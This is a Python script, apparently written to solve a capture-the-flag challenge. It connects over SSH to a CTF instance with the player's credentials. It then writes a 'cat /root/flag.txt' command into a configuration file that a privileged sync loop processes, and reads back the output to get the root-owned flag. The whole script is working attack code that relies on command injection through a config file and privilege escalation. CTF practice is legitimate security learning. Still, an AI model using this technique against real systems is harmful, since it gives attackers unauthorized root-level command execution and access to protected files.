#!/usr/bin/env python3
"""Get flag via .sync directory"""
import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c, timeout=15):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=timeout)
    return (stdout.read() + stderr.read()).decode()

print("[*] Exploiting .sync directory mechanism...")

# Check .sync directory
print("\n[1] Current .sync directory:")
print(cmd("ls -la /opt/mc/.sync/"))

# Set command and monitor .sync directory
print("\n[2] Setting flag extraction command...")
cmd('echo "talldwarf-sync-command=cat /root/flag.txt" > /opt/mc/config/sync-request.conf')

print("[3] Waiting 15 seconds for sync-loop to process...")
time.sleep(15)

# Check if sync.trigger was created
print("\n[4] Checking sync.trigger:")
print(cmd("cat /opt/mc/.sync/sync.trigger 2>/dev/null"))

# Check if sync.result was created
print("\n[5] Checking sync.result:")
result = cmd("cat /opt/mc/.sync/sync.result 2>/dev/null")
print(result)

if "tdho{" in result or "flag" in result.lower():
    print(f"\n[FLAG FOUND]: {result}")
else:
    # List all files in .sync
    print("\n[6] All files in .sync:")
    print(cmd("ls -laR /opt/mc/.sync/"))
    
    # Check if the command was actually executed by looking for any new files
    print("\n[7] Looking for flag in any .sync files:")
    print(cmd("grep -r 'tdho{' /opt/mc/.sync/ 2>/dev/null"))
    print(cmd("find /opt/mc/.sync/ -type f -exec cat {} \\; 2>/dev/null"))

ssh.close()
